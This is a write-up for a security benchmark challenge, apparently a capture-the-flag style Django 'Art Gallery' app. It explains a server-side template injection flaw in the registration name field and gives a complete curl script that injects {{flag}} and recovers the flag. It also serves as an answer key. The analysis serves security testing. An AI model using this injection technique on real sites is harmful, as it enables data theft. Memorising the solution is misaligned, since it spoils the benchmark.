# XBEN-025-24 — Art Gallery

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Server-Side Template Injection (SSTI) in the Django template engine, via the registration "name" field.

## Root cause

`app/ssti_debug_art_gallery/accounts/views.py`, `register_step3`:

```python
flag = open('/flag').read()
...
engine = engines["django"]
template_str = open('accounts/templates/accounts/register_step3.html','r').read()
template = engine.from_string(template_str.replace('ACCOUNTNAME', request.session['name']))
...
return HttpResponse(template.render({'flag':flag}, request))
```

The `register_step3.html` template contains the literal placeholder `ACCOUNTNAME` inside a `<script>` tag (`alert("Hello ACCOUNTNAME. ...")`). The view does a raw Python string `.replace()` of that placeholder with the user-controlled `name` field (collected, unsanitized, in step 1 — `Step1Form.name` is just a `CharField(max_length=100)` with no character restrictions) **before** compiling the string as a Django template with `engine.from_string(...)`. Since `name` becomes part of the template source itself (not template *data*), any Django template syntax in it is executed. The render call already passes `{'flag': flag}` into the context, so simply injecting `{{flag}}` as the name is enough to print the flag directly — no need for a Django SSTI RCE gadget.

## Exploit

```bash
PORT=<PORT>          # from docker compose port, e.g. 62470
BASE=http://localhost:$PORT
COOKIES=/tmp/xben025_cookies.txt

# Step 1: grab CSRF token, submit name = "{{flag}}" as the registration name
STEP1=$(curl -s -c $COOKIES -b $COOKIES $BASE/accounts/register/step1/)
CSRF=$(echo "$STEP1" | grep -o 'csrfmiddlewaretoken[^>]*value="[^"]*"' | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)

curl -s -c $COOKIES -b $COOKIES -X POST $BASE/accounts/register/step1/ \
  -H "Referer: $BASE/accounts/register/step1/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "name={{flag}}" \
  --data-urlencode "password=SuperSecret123"

# Step 2: email (any value)
STEP2=$(curl -s -c $COOKIES -b $COOKIES $BASE/accounts/register/step2/)
CSRF2=$(echo "$STEP2" | grep -o 'csrfmiddlewaretoken[^>]*value="[^"]*"' | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)

curl -s -c $COOKIES -b $COOKIES -X POST $BASE/accounts/register/step2/ \
  -H "Referer: $BASE/accounts/register/step2/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF2" \
  --data-urlencode "email=attacker@example.com"

# Step 3: GET triggers the vulnerable template compile/render — our {{flag}} executes
curl -s -c $COOKIES -b $COOKIES $BASE/accounts/register/step3/
```
